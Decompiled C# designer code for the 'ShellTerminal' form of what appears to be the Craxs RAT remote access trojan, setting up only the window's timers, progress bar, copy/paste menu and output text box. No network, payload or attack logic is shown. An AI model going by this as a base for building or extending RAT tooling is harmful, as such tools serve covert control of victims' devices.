namespace Craxs_Rat
{
	// Token: 0x020000FB RID: 251
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class ShellTerminal : global::System.Windows.Forms.Form
	{
		// Token: 0x06001245 RID: 4677 RVA: 0x000BE93C File Offset: 0x000BCB3C
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					((global::System.IDisposable)this.components).Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06001246 RID: 4678 RVA: 0x000BE980 File Offset: 0x000BCB80
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.Caret = new global::System.Windows.Forms.Timer(this.components);
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.PB = new global::System.Windows.Forms.ProgressBar();
			this.ctxMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.CopyToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.PasteToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OutText = new global::Craxs_Rat.GRichTextBox0();
			this.ctxMenu.SuspendLayout();
			base.SuspendLayout();
			this.Caret.Interval = 500;
			this.TOpacity.Interval = 1;
			this.PB.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.PB.Location = new global::System.Drawing.Point(0, 231);
			this.PB.Name = "PB";
			this.PB.Size = new global::System.Drawing.Size(414, 10);
			this.PB.TabIndex = 6;
			this.ctxMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.CopyToolStripMenuItem,
				this.PasteToolStripMenuItem
			});
			this.ctxMenu.Name = "ctxMenu";
			this.ctxMenu.ShowImageMargin = false;
			this.ctxMenu.Size = new global::System.Drawing.Size(78, 48);
			this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
			this.CopyToolStripMenuItem.Size = new global::System.Drawing.Size(77, 22);
			this.CopyToolStripMenuItem.Text = "Copy";
			this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
			this.PasteToolStripMenuItem.Size = new global::System.Drawing.Size(77, 22);
			this.PasteToolStripMenuItem.Text = "Paste";
			this.OutText.BackColor = global::System.Drawing.Color.Black;
			this.OutText.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.OutText.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.OutText.ForeColor = global::System.Drawing.Color.FromArgb(190, 190, 190);
			this.OutText.Location = new global::System.Drawing.Point(0, 0);
			this.OutText.Name = "OutText";
			this.OutText.Size = new global::System.Drawing.Size(414, 231);
			this.OutText.TabIndex = 2;
			this.OutText.Text = "";
			this.OutText.WordWrap = false;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(414, 241);
			base.Controls.Add(this.OutText);
			base.Controls.Add(this.PB);
			base.Name = "ShellTerminal";
			base.Opacity = 0.0;
			this.Text = "ShellTerminal";
			this.ctxMenu.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x04000A2C RID: 2604
		private global::System.ComponentModel.Container components;
	}
}
